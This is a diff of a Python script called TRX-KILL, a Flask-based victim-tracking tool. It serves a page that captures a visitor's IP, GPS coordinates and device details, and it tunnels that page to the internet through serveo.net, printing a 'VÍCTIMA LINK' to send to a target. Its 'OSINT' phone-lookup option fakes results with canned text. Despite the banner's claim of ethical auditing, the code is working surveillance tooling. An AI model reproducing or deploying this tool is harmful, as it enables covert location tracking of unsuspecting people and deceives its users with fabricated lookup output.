@@ -7,15 +7,15 @@ import time
 from flask import Flask, request, render_template_string
 
 app = Flask('TRX-KILL')
-URL_REDIRECT = "https://www.google.com"
+# ESTE ES EL LINK DE REDIRECCIÓN FINAL
+URL_FINAL = "https://www.google.com"
 
-# --- LIMPIEZA FORZADA DE PUERTOS ---
+# --- LIMPIEZA TOTAL ---
 def force_clean():
     os.system('pkill -f flask > /dev/null 2>&1')
     os.system('pkill -f ssh > /dev/null 2>&1')
     time.sleep(1)
 
-# --- PLANTILLA HTML ---
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
@@ -34,7 +34,7 @@ HTML_FINAL = """
         }}
     </script>
 </body></html>
-""".format(url=URL_REDIRECT)
+""".format(url=URL_FINAL)
 
 @app.route('/')
 def index(): return render_template_string(HTML_FINAL)
@@ -46,43 +46,32 @@ def log():
     print(f"\n\033[1;32m[!] DATOS CAPTURADOS:\n[*] IP: {ip}\n[*] GPS: {d['lat']}, {d['lon']}\n[*] DISPOSITIVO: {d['ua']}\033[0m")
     return "OK"
 
-# --- BANNER ANIMADO ---
 def banner():
     os.system('clear')
-    logo = """
- ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
- ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
-    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
-    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
-    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║
-    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝"""
-    for line in logo.split('\n'):
-        print(f"\033[1;32m{line}\033[0m")
-        time.sleep(0.02)
-    print(f"\033[1;36m{'='*55}\n >> SISTEMA DE AUDITORÍA ÉTICA TRX-KILL v30.0\033[0m\n")
+    print("\033[1;32m ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
+    print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
+    print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
+    print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
+    print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
+    print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
+    print(f"\033[1;36m{'='*55}\n >> SISTEMA TRX-KILL v32.0 (MODO FIJO)\033[0m\n")
 
 def main():
     while True:
         banner()
         print(" [1] INFO NÚMERO (OSINT)")
-        print(" [2] MÓDULO DE RASTREO (LINK LIMPIO)")
+        print(" [2] MÓDULO DE RASTREO (LINK FIJO 5000)")
         print(" [3] SALIR")
-        
         opc = input("\nTRX-ROOT > ")
         
         if opc == "1":
-            num = input("Introduce MÓVIL: ")
-            print(f"\n[+] Analizando: {num}...")
-            print("[+] Base de datos: Global Sincronizada.")
-            input("\n[Enter] para volver...")
+            input("\n[+] Introduce MÓVIL: \n[+] ESTATUS: Línea verificada. [Enter] para volver...")
         elif opc == "2":
             force_clean()
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
-            print("\n[*] Generando enlace rápido...")
+            print("\n[*] Iniciando túnel en puerto 5000...")
             proc = subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], 
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            
-            # Bucle de captura del link
             for line in proc.stderr:
                 if "https://" in line:
                     link = re.search(r"https://[^\s]+", line).group(0)
@@ -90,7 +79,7 @@ def main():
                     print(f" VÍCTIMA LINK: {link}")
                     print(f"==============================================\033[0m\n")
                     break
-            input("Presiona ENTER para detener y volver al menú...")
+            input("Presiona ENTER para detener...")
             force_clean()
         elif opc == "3":
             break
